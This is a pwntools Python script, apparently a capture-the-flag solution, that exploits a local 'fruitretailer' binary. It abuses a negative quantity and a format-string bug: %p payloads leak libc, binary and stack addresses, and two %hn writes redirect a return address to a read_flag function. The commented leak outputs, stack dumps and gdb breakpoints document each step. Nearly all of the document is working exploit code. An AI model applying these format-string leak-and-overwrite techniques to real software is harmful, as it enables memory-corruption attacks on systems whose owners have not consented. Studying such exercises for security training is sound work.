#! /usr/bin/python

from pwn import *

s = process('./fruitretailer')

APPLE = 1
BANANA = 2

def print_menu():
    #print s.recvuntil('choice:')
    s.recvuntil('choice:')

def buy(fruit_type, quantity, address = ''):
    s.sendline('1')
    s.sendlineafter('(2)?:', str(fruit_type))
    s.sendlineafter('quantity:', str(quantity))
    if address and address != '':
        s.sendlineafter('(Y/N)', 'Y')
        s.sendline(address)
    else:
        s.sendlineafter('(Y/N)', 'N')
    print s.recvline()
    print_menu()

def create_invoice():
    s.sendline('2')
    s.recvline()
    s.recvline()
    result = s.recvline()
    print_menu()
    return result

def change_label(index, label):
    s.sendline('3')
    s.sendlineafter('change:', str(index))
    s.sendlineafter('label:', str(label))  
    print_menu()

def change_comment(index, address):
    s.sendline('4')
    s.sendlineafter('change:', str(index))
    s.sendlineafter('address:', address)
    print_menu()

print_menu()

#0x7fffffffb670.0x7ffff7dd3780.0x7ffff7b042c0.0x7ffff7fd9700.0xc.0x7fffffffdd10.0x555555758020
#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%p.%p.%p.%p.%p.%p.%p

#0xc.0x7fffffffdd10.0x555555758020.0x7fffffffdd30.0x5555555554b0.0x7fffffffde18
#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%5$p.%6$p.%7$p.%8$p.%9$p.%10$p

#0x7fffffffde18.0x100000000.0x5555555554d0.0x7ffff7a2d830.0x1
#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%10$p.%11$p.%12$p.%13$p.%14$p

# 0x5555555552a5:	ret 
# 0000| 0x7fffffffdd18 --> 0x5555555554b0 (jmp    0x5555555554c8) <- ret from create_invoice

# libc = 0x7ffff7a0d000
# base = 0x555555554000
# read_flag_offset = 0xc92
# ret_addr = 0x7fffffffdd18

# 0x7ffff7a2d830.0x5555555554b0.0x7fffffffdd10AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%13$p.%9$p.%6$p
# 0x7ffff7a2d830 - 0x7ffff7a0d000 = 0x20830
# 0x5555555554b0 - 0x555555554000 = 0x14B0
# 0x7fffffffdd10 + 0x8 = 0x7fffffffdd18

buy(BANANA,'-1','A' * 64 + '%13$p.%9$p.%6$p')
change_label(1,'a' * 10)
data = create_invoice()
print data
parts = data.split('|')
libc_addr = int(parts[6][0:14:], 16) - 0x20830
base_addr = int(parts[6][15:29:], 16) - 0x14B0
ret_addr = int(parts[6][30:44:], 16) + 0x8
read_flag_addr = base_addr + 0xc92
log.info('libc_addr = ' + hex(libc_addr)) 
log.info('read_flag_addr = ' + hex(read_flag_addr)) 
log.info('ret_addr = ' + hex(ret_addr)) 

'''
6th arg = 0x7fffffffdd10
8th arg = 0x7fffffffdd30

0x7fffffffdd00:	0x00007fffffffdd10	0x0000555555554c90  <--- 6th, 7th
0x7fffffffdd10:	0x00007fffffffdd30	0x000055555555547c  <--- 8th, 9th
0x7fffffffdd20:	0x00007fffffffde18	0x0000000100000000
0x7fffffffdd30:	0x00005555555554d0	0x00007ffff7a2d830
0x7fffffffdd40:	0x0000000000000001	0x00007fffffffde18
0x7fffffffdd50:	0x00000001f7ffcca0	0x000055555555545c
'''
# Plan:
# ret           -> read_flag     
#0x7fffffffdd18 (current data: 0x5555555554b0) -> 0x555555554c92

# Gone be doing it in 2 steps:

# 1: 0x7fffffffdd00 (current data: 0x7fffffffdd10) -> 0x7fffffffdd18
buy(BANANA,'-1', 'B' * 64 + '%'+str(ret_addr&0xffff)+'x%6$hn')
change_label(2,'b' * 10)
create_invoice()

# 2: 0x7fffffffdd10 (current data: 0x7fffffffdd18) -> 0x555555554c92
buy(BANANA,'-1','C' * 64 + '%'+str(read_flag_addr&0xffff)+'x%8$hn')
change_label(3,'c' * 10)

'''
# 0x5555555552a6 - change_label
# 0x55555555507a - create_invoice
gdb.attach(s, """
b * 0x5555555552a6
b * 0x5555555552fa
b * 0x55555555507a
b * 0x555555555220
b * 0x5555555552a4
x/32gx 0x0000555555758020
""")
'''

s.sendline('2')

s.interactive()



















































